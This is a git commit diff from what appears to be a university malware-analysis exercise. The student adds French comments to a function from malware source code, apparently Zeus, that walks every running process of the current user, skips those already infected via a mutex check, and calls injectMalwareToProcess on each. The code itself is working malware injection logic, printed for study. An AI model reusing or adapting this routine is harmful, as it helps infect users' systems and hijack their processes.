969f4e546ea2ac3ebce84dece3e12da8ee6e32b1
Arthur Provost <arthur.provost@insa-rennes.fr>
2018-01-21 22:42:12 -0500

    Add comment in infectAllProcess in ject.cpp

--- Analyse de code malicieux/Exo1_inject_commanted.cpp
+++ Analyse de code malicieux/Exo1_inject_commanted.cpp
@@ -91,61 +91,64 @@ bool MainInject::_injectToAll(void)
  
   do
   {
-    HANDLE snap = CWA(kernel32, createToolhelp32Snapshot) (TH32CS_SNAPPROCESS, 0);   //CreateToolhelp32Snapshot permet de prendre un snapshot des processus du systeme. Handle est l'indice référencant la structure retournée par l'API windows.
+    HANDLE snap = CWA(kernel32, createToolhelp32Snapshot) (TH32CS_SNAPPROCESS, 0); //CreateToolhelp32Snapshot avec cet argument, prend un snapshot de TOUS les processus du systeme. Handle est l'indice   référencant la structure retournée par l'API windows
 
     newProcesses = 0; //creer un processus bidon
  
     if(snap != INVALID_HANDLE_VALUE) //Si la structure accessible par le HANDLE snap est valide
     {
-      PROCESSENTRY32W pe; //structure qui décrit une entrée d'une liste des processus
-      pe.dwSize = sizeof(PROCESSENTRY32W); //On set la taille de la structure avant de lutiliser
+      PROCESSENTRY32W pe; //structure qui décrit l'entrée de la liste des processus
+      pe.dwSize = sizeof(PROCESSENTRY32W); //initialisation de la taille de la structure
  
-      if(CWA(kernel32, Process32FirstW)(snap, &pe))do //Process32FirstW apermet davoir un snapshot de la liste des processus apres avoir appeller lapi. 
-//enregistre la liste des process capturés par snap dans la liste pe
+      if(CWA(kernel32, Process32FirstW)(snap, &pe))do //Process32FirstW permet de récupérer les informatios sur le premier processus dans la liste. Ces informations sont enregistrés dans pe
       {
-        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid est valide est nest pas le procesuss maitre
+        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid du processes est valide et TODO
         {
-          TOKEN_USER *tu;
-          DWORD sessionId;
+          TOKEN_USER *tu; //structure qui identifie un utilisateur associé à son token (qui l'identifie, identifie son groupe et ses privilèges)
+          DWORD sessionId; //id de l'utilisateur du processus
           DWORD sidLength;
- // si le process a deja été infecté, on skip
-          for(DWORD i = 0; i < injectedPidsCount; i++)
-if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;
- // un mutex = évite que des ressources partagées d'un système ne soient utilisées en même temps.
-          HANDLE mutexOfProcess = MainCore::createMutexOfProcess(pe.th32ProcessID); //Definit un objet mutex  sur le processus
-          if(mutexOfProcess == NULL)goto SKIP_INJECT;
+
+          for(DWORD i = 0; i < injectedPidsCount; i++) if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT; // si le process a deja été infecté, on saute à SKIP_INJECT
+
+ 	  // Le mutex permet d'éviter d'infecté le processus plus d'une fois
+          HANDLE mutexOfProcess = MainCore::createMutexOfProcess(pe.th32ProcessID); //Definit un objet mutex sur le processus
+          if(mutexOfProcess == NULL) goto SKIP_INJECT; //si le mutex vaut NULL, c'est quand mutex à déja était créé sur ce processus, et docn qu'il a déja était infecté
  
-          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)//Recupere lutilisateur en fct du pid du processus. tu = lutilisateur correspondant
+          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)//Recupere l'utilisateur lié au processus.
           {
+
             //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
-//si l’utilisateur est actuellement connecté
+	    //si l’utilisateur est l'utilisateur courant et que tous les octets sont les memes (meme identifiant de securiter (sid)...)
             if(sessionId == coreData.currentUser.sessionId &&
                (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
-               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)//si les octets sont les memes (meme identifiant de securiter (sid)...)
+               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
             {
-// enregistre le pid du process dans la liste des pid infectés (etonnant car on l’a pas encore infecté)
+
+	      //resize la structure avc une taille plus grande (taille actuelle + 1 DWORD)
               if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
-              { //resize la structure avc plus de place 
+              {
+	        // enregistre le pid du process dans la liste des pid des processus qui sont infectés
                 injectedPids[injectedPidsCount++] = pe.th32ProcessID;
                 newProcesses++;
  
                 WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);
- // fonction au dessus: check les vulnérabilités et infecte le process
-                if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
+ 		// Appel la fonction pour infecter le processus avec le pid pe.th32ProcessID
+                if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0)) ok = true; //ok = true si l'infection s'est bien passée
               }
+
 #             if(BO_DEBUG > 0)
               else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
 #             endif
             }
-            Mem::free(tu); //libere le tocken user
+            Mem::free(tu); //libere le token user
           }
  
-          CWA(kernel32, CloseHandle)(mutexOfProcess);
+          CWA(kernel32, CloseHandle)(mutexOfProcess); //ferme l'objet HANDLE (référence sur l'object mutex créé sur le processus)
  
-SKIP_INJECT:;
+SKIP_INJECT:; // FLAG de destination pour le "goto SKIP_INJECT"
         }
       }
-      while(CWA(kernel32, Process32NextW)(snap, &pe));
+      while(CWA(kernel32, Process32NextW)(snap, &pe)); //tant qu'il y reste d'autres processus dans la liste du snap
  
       CWA(kernel32, CloseHandle)(snap);
     }
@@ -153,9 +156,9 @@ SKIP_INJECT:;
     else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
 #   endif
   }
-  while(newProcesses != 0);
+  while(newProcesses != 0); //tant qu'au moins 1 processus a été récupéré et infecté
  
-  Mem::free(injectedPids);
+  Mem::free(injectedPids); //libère l'espace mémoire du tableau
  
   return ok;
 }
